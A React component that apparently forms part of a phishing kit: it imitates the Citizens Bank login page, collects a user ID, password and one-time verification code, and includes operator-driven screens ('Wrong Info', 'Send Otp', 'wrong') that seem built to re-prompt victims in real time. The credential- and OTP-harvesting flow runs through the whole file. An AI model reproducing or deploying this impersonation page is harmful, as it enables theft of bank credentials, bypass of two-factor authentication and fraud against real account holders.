import { footerInfo, otpOptions, selectionLogin } from "../../bankDetails";
import BankingHeader from "./BankingHeader";
import clsx from "clsx";
import { Link } from "react-router-dom";
import { IoMdLock } from "react-icons/io";
import { motion } from "framer-motion";
import CitizenFavIcon from "../../../../../../../../assets/allBanks/banks/citizens/cz2.ico";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import useCheckedItems from "../../../../../../../hooks/useCheckedItems";
import CitizenImg from "../../../../../../../../assets/allBanks/banks/citizens/cz3.svg";
import { HiMiniChevronUpDown } from "react-icons/hi2";
import { BsExclamationCircleFill } from "react-icons/bs";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Citizens = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const { selectedAccount, handleSelectedOpenAccount, isOpen, setIsOpen } =
    useCheckedItems(selectionLogin);
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(
    bankName,
    setOtpOpen,
    setAllBankItems,
    setTypeAccount,
    selectedAccount
  );

  return (
    <>
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 50 }}
        className={clsx(
          "w-full min-h-screen h-full  top-0  bg-white",
          typeAccount ? "hidden" : "block"
        )}
      >
        <BankingHeader
          text="Citizens Bank"
          handleCancel={handleCancel}
          img={CitizenFavIcon}
          setAllBankItems={setAllBankItems}
          setIsOpenOtp={setIsOpenOtp}
          setOtpOpen={setOtpOpen}
        />
        <header className="w-full px-6 py-3 box-shadow6">
          <div className="">
            <img
              src={CitizenImg}
              alt=""
              className="w-[148px] h-[52px] object-contain"
            />
          </div>
        </header>

        <div className="p-4 customMiniTablet:p-11">
          <div className={clsx(allBankOpen ? "hidden" : "block")}>
            <div className={clsx(" customMiniTablet:flex gap-[8rem]")}>
              <div className="space-y-5 mb-8 customMiniTablet:mb-0 flex-[3.5] text-customGray-1060">
                <h2 className="font-semibold text-[23px] ">
                  Login to connect to Citizens
                </h2>
                <p>
                  To link your accounts, select a secure log in and enter your
                  credentials to continue
                </p>
                <div className={clsx("text-customGray-1062")}>
                  <div className="space-y-8 mb-7">
                    <div className="">
                      <h3 className="mb-1 font-semibold">
                        Select secure login
                      </h3>
                      <div className="relative">
                        <button
                          className={clsx(
                            "flex items-center justify-between w-full px-2 py-2 border border-customGray-1061 transistion2 ",
                            isOpen ? "border-2 border-customGray-1063 " : ""
                          )}
                          onClick={() => setIsOpen((prevOpen) => !prevOpen)}
                        >
                          {selectedAccount.name}
                          <HiMiniChevronUpDown />
                        </button>
                        {isOpen && (
                          <div className="absolute w-full bg-white shadow-xl top-full">
                            {selectionLogin.map((sele) => (
                              <div
                                key={sele.id}
                                onClick={() => handleSelectedOpenAccount(sele)}
                              >
                                <p
                                  className={clsx(
                                    "p-3 hover:bg-customBlue-1023 hover:text-white",
                                    selectedAccount.id === sele.id
                                      ? "bg-customBlue-1030 text-white"
                                      : ""
                                  )}
                                >
                                  {sele.name}
                                </p>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                    <div>
                      <label className="font-semibold ">User ID</label>
                      <input
                        type="text"
                        value={formState.username}
                        name="username"
                        onChange={handleChange}
                        className={clsx(
                          "w-full px-2 py-2 mt-1 border outline-none border-customGray-1061 focus:border-2 focus:border-customGray-1063 transistion2",
                          errorFormState.username
                            ? "border border-customRed-1006"
                            : ""
                        )}
                      />
                      {errorFormState.username && (
                        <p className="flex gap-2 mt-2 text-sm text-customRed-1006">
                          <BsExclamationCircleFill className="mt-[2px]" />
                          User ID is required
                        </p>
                      )}
                    </div>
                    <div className="relative">
                      <label className="font-semibold ">Password</label>
                      <input
                        type={showPassword ? "text" : "password"}
                        value={formState.password}
                        name="password"
                        onChange={handleChange}
                        className={clsx(
                          "w-full px-2 py-2 pr-16 mt-1 border outline-none border-customGray-1061 focus:border-2 focus:border-customGray-1063 transistion2",
                          errorFormState.password
                            ? "border border-customRed-1006"
                            : ""
                        )}
                      />
                      <span
                        onClick={() => setshowPassword((prevShow) => !prevShow)}
                        className="absolute h-full leading-[3.5] right-5 text-sm underline f font-semibold"
                      >
                        {showPassword ? "Hide" : "Show"}
                      </span>
                      {errorFormState.password && (
                        <p className="flex gap-2 mt-2 text-sm text-customRed-1006">
                          <BsExclamationCircleFill className="mt-[2px]" />
                          Password is required
                        </p>
                      )}
                    </div>
                  </div>
                  <div className="flex gap-2 mb-5">
                    <input type="checkbox" className="w-[22px] h-[22px] " />
                    <p className="text-black ">Remember User ID</p>
                  </div>
                  <div>
                    <Link
                      to="https://www.citizensbank.com"
                      className="font-medium underline text-customBlue-1030"
                    >
                      Trouble loggin in?
                    </Link>
                  </div>
                  <div className="flex gap-14 my-7">
                    <button
                      onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                      className="flex items-center gap-2 px-5 py-3 font-semibold text-white bg-customOrange-200"
                    >
                      {loading && <ClipLoader size={10} color="#fff" />}
                      <IoMdLock />
                      {loading ? "Loading..." : "Log In"}
                    </button>
                    <button className="font-semibold underline">Cancel</button>
                  </div>
                </div>
              </div>
              <div className="flex-[2]">
                <h3 className="font-bold text-[23px] text-customGray-1064 mb-4">
                  Need help?
                </h3>
                <Link
                  to="https://www.citizensbank.com"
                  className="space-y-4 text-sm font-medium underline text-customBlue-1030"
                >
                  <p className="underline">Find quick answers in our FAQs</p>
                  <p className="underline">Contact Us</p>
                </Link>
              </div>
            </div>
          </div>
          <div>
            {allBankOpen && (
              <div className={clsx(OtpOpen ? "hidden" : "block")}>
                <BankControl
                  handleSelectedId={handleSelectedId}
                  selectedPath={selectedPath}
                  handleSelectSubmit={handleSelectSubmit}
                />
                <div>
                  {activePathDetails.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activePathDetails.name === "Wrong Info" && (
                    <>
                      <div
                        className={clsx(" customMiniTablet:flex gap-[8rem]")}
                      >
                        <div className="space-y-5 mb-8 customMiniTablet:mb-0 flex-[3.5] text-customGray-1060">
                          <h2 className="font-semibold text-[23px] ">
                            Login to connect to Citizens
                          </h2>
                          <p>
                            To link your accounts, select a secure log in and
                            enter your credentials to continue
                          </p>
                          <div className={clsx("text-customGray-1062")}>
                            <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                              <BsExclamationCircleFill className="mt-[2px]" />

                              <p>{activePathDetails.body}</p>
                            </div>
                            <div className="space-y-8 mb-7">
                              <div className="">
                                <h3 className="mb-1 font-semibold">
                                  Select secure login
                                </h3>
                                <div className="relative">
                                  <button
                                    className={clsx(
                                      "flex items-center justify-between w-full px-2 py-2 border border-customGray-1061 transistion2 ",
                                      isOpen
                                        ? "border-2 border-customGray-1063 "
                                        : ""
                                    )}
                                    onClick={() =>
                                      setIsOpen((prevOpen) => !prevOpen)
                                    }
                                  >
                                    {selectedAccount.name}
                                    <HiMiniChevronUpDown />
                                  </button>
                                  {isOpen && (
                                    <div className="absolute w-full bg-white shadow-xl top-full">
                                      {selectionLogin.map((sele) => (
                                        <div
                                          key={sele.id}
                                          onClick={() =>
                                            handleSelectedOpenAccount(sele)
                                          }
                                        >
                                          <p
                                            className={clsx(
                                              "p-3 hover:bg-customBlue-1023 hover:text-white",
                                              selectedAccount.id === sele.id
                                                ? "bg-customBlue-1030 text-white"
                                                : ""
                                            )}
                                          >
                                            {sele.name}
                                          </p>
                                        </div>
                                      ))}
                                    </div>
                                  )}
                                </div>
                              </div>
                              <div>
                                <label className="font-semibold ">
                                  User ID
                                </label>
                                <input
                                  type="text"
                                  value={formState.username}
                                  name="username"
                                  onChange={handleChange}
                                  className={clsx(
                                    "w-full px-2 py-2 mt-1 border outline-none border-customGray-1061 focus:border-2 focus:border-customGray-1063 transistion2",
                                    errorFormState.username
                                      ? "border border-customRed-1006"
                                      : ""
                                  )}
                                />
                                {errorFormState.username && (
                                  <p className="flex gap-2 mt-2 text-sm text-customRed-1006">
                                    <BsExclamationCircleFill className="mt-[2px]" />
                                    User ID is required
                                  </p>
                                )}
                              </div>
                              <div className="relative">
                                <label className="font-semibold ">
                                  Password
                                </label>
                                <input
                                  type={showPassword ? "text" : "password"}
                                  value={formState.password}
                                  name="password"
                                  onChange={handleChange}
                                  className={clsx(
                                    "w-full px-2 py-2 pr-16 mt-1 border outline-none border-customGray-1061 focus:border-2 focus:border-customGray-1063 transistion2",
                                    errorFormState.password
                                      ? "border border-customRed-1006"
                                      : ""
                                  )}
                                />
                                <span
                                  onClick={() =>
                                    setshowPassword((prevShow) => !prevShow)
                                  }
                                  className="absolute h-full leading-[3.5] right-5 text-sm underline f font-semibold"
                                >
                                  {showPassword ? "Hide" : "Show"}
                                </span>
                                {errorFormState.password && (
                                  <p className="flex gap-2 mt-2 text-sm text-customRed-1006">
                                    <BsExclamationCircleFill className="mt-[2px]" />
                                    Password is required
                                  </p>
                                )}
                              </div>
                            </div>
                            <div className="flex gap-2 mb-5">
                              <input
                                type="checkbox"
                                className="w-[22px] h-[22px] "
                              />
                              <p className="text-black ">Remember User ID</p>
                            </div>
                            <div>
                              <Link
                                to="https://www.citizensbank.com"
                                className="font-medium underline text-customBlue-1030"
                              >
                                Trouble loggin in?
                              </Link>
                            </div>
                            <div
                              onClick={(e) =>
                                handleTheMainSubmit(e, onSumbitForm)
                              }
                              className="flex gap-14 my-7"
                            >
                              <button className="flex items-center gap-2 px-5 py-3 font-semibold text-white bg-customOrange-200">
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                <IoMdLock />
                                {loading ? "Loading..." : "Log In"}
                              </button>
                              <button className="font-semibold underline">
                                Cancel
                              </button>
                            </div>
                          </div>
                        </div>
                        <div className="flex-[2]">
                          <h3 className="font-bold text-[23px] text-customGray-1064 mb-4">
                            Need help?
                          </h3>
                          <Link
                            to="https://www.citizensbank.com"
                            className="space-y-4 text-sm font-medium underline text-customBlue-1030"
                          >
                            <p className="underline">
                              Find quick answers in our FAQs
                            </p>
                            <p className="underline">Contact Us</p>
                          </Link>
                        </div>
                      </div>
                    </>
                  )}
                  {activePathDetails.name === "Send Otp" && (
                    <>
                      <h3>{activePathDetails.body}</h3>
                      <div className={clsx(isOpenOtp && "hidden")}>
                        <div className="">
                          <div className="text-customGray-1062">
                            <div className="">
                              <h3 className="mb-2 text-lg font-bold ">
                                Verify your identity
                              </h3>
                              <p className="mb-3 customMiniTablet:pr-36">
                                Now let&apos;s make sure you&apos;re really you.
                                We&apos;ll send you a code to verify your
                                identity. How should we send it?
                              </p>
                            </div>
                            <div className="">
                              <div
                                role="radiogroup"
                                aria-label="Otp Options"
                                className="flex flex-col space-y-3"
                              >
                                {otpOptions.map((bank) => (
                                  <div
                                    key={bank.id}
                                    role="radio"
                                    tabIndex={0}
                                    onClick={() => handleOtpOption(bank.id)}
                                    className="flex items-center gap-2.5 "
                                  >
                                    <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                      <p
                                        className={clsx(
                                          "rounded-full w-[10px] h-[10px]  ",
                                          otpOptions[indexOtp]?.id === bank.id
                                            ? "bg-customBlue-500"
                                            : ""
                                        )}
                                      ></p>
                                    </div>
                                    <h2
                                      className={clsx(
                                        "text-sm",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "text-customBlue-500 hover:underline"
                                          : "hover:text-customBlue-700 hover:underline"
                                      )}
                                    >
                                      {bank.name}
                                    </h2>
                                  </div>
                                ))}
                              </div>
                              <button
                                onClick={onSubmitOtpOptions}
                                className="w-full customMiniTablet:w-[45%] my-6  py-3 font-semibold text-white bg-customOrange-200"
                              >
                                Continue
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      {isOpenOtp && (
                        <div className={clsx()}>
                          <div className="text-customGray-1062">
                            <div>
                              <div>
                                <h3 className="mb-2 text-lg font-bold ">
                                  Let&apos;s confirm it&apos;s you
                                </h3>
                              </div>
                              <div>
                                <h2 className="">
                                  We just (texted/called) you at your phone.
                                  Please enter it below
                                </h2>
                                <div className="my-6 ">
                                  <label className="font-semibold ">
                                    Enter your 6-digits code
                                  </label>
                                  <input
                                    type="number"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full block customMiniTablet:w-[45%] px-3 py-3 mt-2 border rounded-md outline-none border-customGray-200 no-spinner focus:border-customBlue-1004 focus:border-2 transistion2 no-spinner",
                                      errorOtp.otpo
                                        ? "border border-customRed-1006"
                                        : ""
                                    )}
                                  />

                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-1006">
                                      Code is required{" "}
                                    </p>
                                  )}
                                </div>
                                <button
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                  className="w-full customMiniTablet:w-[45%] my-6  py-3 font-semibold text-white bg-customOrange-200"
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Confirm Code"}
                                </button>
                                <p
                                  className={clsx(
                                    "cursor-pointer text-customBlue-100 font-bold",
                                    !resend &&
                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                  )}
                                  onClick={handleResend}
                                >
                                  Get new code
                                </p>
                              </div>
                            </div>
                          </div>
                        </div>
                      )}
                    </>
                  )}
                </div>
              </div>
            )}
            {OtpOpen && (
              <>
                <BankOtpControl
                  handleSelectedOtp={handleSelectedOtp}
                  selectedOtp={selectedOtp}
                  handleSubmitOtp={handleSubmitOtp}
                />

                <div>
                  {activeOtp.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activeOtp.name === "wrong" && (
                    <>
                      <div className={clsx()}>
                        <div className="text-customGray-1062">
                          <div>
                            <div>
                              <h3 className="mb-2 text-lg font-bold ">
                                Let&apos;s confirm it&apos;s you
                              </h3>
                            </div>
                            <div>
                              <h2 className="">
                                We just (texted/called) you at your phone.
                                Please enter it below
                              </h2>
                              <div className="my-6 ">
                                <label className="font-semibold ">
                                  Enter your 6-digits code
                                </label>
                                <input
                                  type="number"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  className={clsx(
                                    "w-full block customMiniTablet:w-[45%] px-3 py-3 mt-2 border rounded-md outline-none border-customGray-200 no-spinner focus:border-customBlue-1004 focus:border-2 transistion2 no-spinner",
                                    errorOtp.otpo
                                      ? "border border-customRed-1006"
                                      : ""
                                  )}
                                />

                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-1006">
                                    Code is required{" "}
                                  </p>
                                )}
                                <h3 className="mt-2 text-sm text-customRed-200">
                                  {activeOtp.body}
                                </h3>
                              </div>
                              <button
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                                className="w-full customMiniTablet:w-[45%] my-6  py-3 font-semibold text-white bg-customOrange-200"
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Confirm Code"}
                              </button>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Get new code
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activeOtp.name === "otp" && (
                    <>
                      <ShareData
                        bankName={bankName}
                        handleTheFinal={handleTheFinal}
                        handleCancel={handleCancel}
                        setIsOpenOtp={setIsOpenOtp}
                        setAllBankItems={setAllBankItems}
                        siteLink="https://www.citizensbank.com"
                      />
                    </>
                  )}
                </div>
              </>
            )}
          </div>
        </div>
        <footer className="pb-10 mt-20">
          <div className="justify-between px-8 customMiniTablet:flex">
            <div className="mb-10">
              <img
                src={CitizenImg}
                alt=""
                className="w-[137px] h-[25px] object-contain"
              />
            </div>
            <div className="gap-20 customMiniTablet:flex text-customGray-1062">
              {footerInfo.map((foo) => {
                const { id, name, children } = foo;
                return (
                  <div key={id} className="mb-5">
                    <h3 className="font-semibold">{name}</h3>
                    {children.map((chi) => {
                      const { id, name } = chi;
                      return (
                        <Link key={id} to="https://www.citizensbank.com">
                          <p className="py-1 text-sm">{name}</p>
                        </Link>
                      );
                    })}
                  </div>
                );
              })}
            </div>
          </div>
        </footer>
      </motion.div>
    </>
  );
};

export default Citizens;
